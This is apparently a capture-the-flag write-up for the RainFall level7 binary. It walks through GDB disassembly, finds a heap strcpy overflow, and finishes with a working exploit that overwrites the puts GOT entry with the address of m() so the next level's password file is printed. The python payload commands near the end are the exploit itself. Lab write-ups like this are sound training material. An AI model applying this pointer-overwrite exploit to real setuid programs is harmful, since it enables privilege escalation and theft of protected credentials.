```sh
level7@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
-rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 42
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 42 42
~~
level7@RainFall:~$ ./level7 42 42 42
~~
```
There is one excutable file **level7**, if we give less then 2 arguments, its segmentation falut, start of 2 arguments, it prints just "~~". \
\
Run the binary file with GDB.
```sh
(gdb) info functions
...
0x080484f4  m
0x08048521  main
...
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp) # 0
   0x08048501 <+13>:    call   0x80483d0 <time@plt> # time(0)
   0x08048506 <+18>:    mov    $0x80486e0,%edx # "%s - %d\n"
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp) # global variable c
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt> # printf("%s - %d\n", c, time(0))
   0x0804851f <+43>:    leave  
   0x08048520 <+44>:    ret    
End of assembler dump.
(gdb) disas main
...
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    0xc(%ebp),%eax
   0x080485a8 <+135>:   add    $0x8,%eax
   0x080485ab <+138>:   mov    (%eax),%eax
   0x080485ad <+140>:   mov    %eax,%edx
   0x080485af <+142>:   mov    0x18(%esp),%eax
   0x080485b3 <+146>:   mov    0x4(%eax),%eax
   0x080485b6 <+149>:   mov    %edx,0x4(%esp)
   0x080485ba <+153>:   mov    %eax,(%esp)
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    $0x80486e9,%edx # "r"
   0x080485c7 <+166>:   mov    $0x80486eb,%eax # "/home/user/level8/.pass"
   0x080485cc <+171>:   mov    %edx,0x4(%esp)
   0x080485d0 <+175>:   mov    %eax,(%esp)
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt> # fopen("/home/user/level8/.pass", "r")
   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
   0x080485dc <+187>:   movl   $0x44,0x4(%esp) # 0x44 = 68
   0x080485e4 <+195>:   movl   $0x8049960,(%esp) # global variable c
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt> # fgets (c, 68, fopen())
   0x080485f0 <+207>:   movl   $0x8048703,(%esp) # "~~"
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
...
```
We can see fopen gets two parameters, in the line main+161, main+166.
```sh
(gdb) x/s 0x80486eb
0x80486eb:       "/home/user/level8/.pass"
(gdb) x/s 0x80486e9
0x80486e9:       "r"
```
and in the main+202, fgets also takes 3 arguments, we can see return value of fopen, 0x44(68) and 0x8049960.
```sh
(gdb) x/s 0x8049960
0x8049960 <c>:   ""
```
c is one of global variable, So it seems be like this.
```c
fgets(c, 68, fopen("/home/user/level8.pass", "r"));
```
And we can see also something in ```m()``` function line 13-38,
```sh
(gdb) x/s 0x80486e0
0x80486e0:       "%s - %d\n"
(gdb) x/s 0x8049960
0x8049960 <c>:   ""
```
So printf should be like
```c
printf("%s - %d\n", c, time(0));
```
The global variable ```c``` takes .pass of level8 with fgets, and the ```m()``` function prints the value of c. but in the main, there is nowhere calling the function ```m()```. \
Let's try buffer overflow strcpy.
```sh
(gdb) r aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7 BBBB
Starting program: /home/user/level7/level7 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7 BBBB

Program received signal SIGSEGV, Segmentation fault.
0xb7eb1922 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
there is no overflow until EIP register, but we can see
```sh
(gdb) i r
eax            0x42424242       1111638594
ecx            0xbffff905       -1073743611
edx            0x37616136       929128758
ebx            0xb7fd0ff4       -1208152076
...
Enter the hex value to find (e.g., 0x63613563): 0x37616136
Little Endian ASCII representation: '6aa7'
'6aa7' found at offset: 20
...
level7@RainFall:~$ ltrace ./level7 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7 BBBB
__libc_start_main(0x8048521, 3, 0xbffff7a4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                      = 0x0804a008
malloc(8)                                                      = 0x0804a018
malloc(8)                                                      = 0x0804a028
malloc(8)                                                      = 0x0804a038
strcpy(0x0804a018, "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab"...)      = 0x0804a018
strcpy(0x37616136, "BBBB" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
```
EDX registers are corrupted in the offset 20. and the value of EAX is second argument, we can think the first ```strcpy()``` is done, but second ```strcpy()``` try the address of ```0x37616136``` with argument ```BBBB```. \
So we can find point of overwrite, after saving data to global variable ```c``` with ```fopen()```, its ```puts()```.
```sh
(gdb) disas main
...
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    $0x0,%eax
...
(gdb) x/i 0x8048400
   0x8048400 <puts@plt>:        jmp    *0x8049928
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
```
So, for the first argument, we put 20 bytes of something + ```puts()``` GOT address and address of ```m()``` function in second argument.
```sh
level7@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa" + "\x28\x99\x04\x08"' > /tmp/exploit7
level7@RainFall:~$ python -c 'print "\xf4\x84\x04\x08"' > /tmp/exploit77
level7@RainFall:~$ ./level7 $(cat /tmp/exploit7) $(cat /tmp/exploit77)
(hidden)
 - 1733521467
```
level7 passed !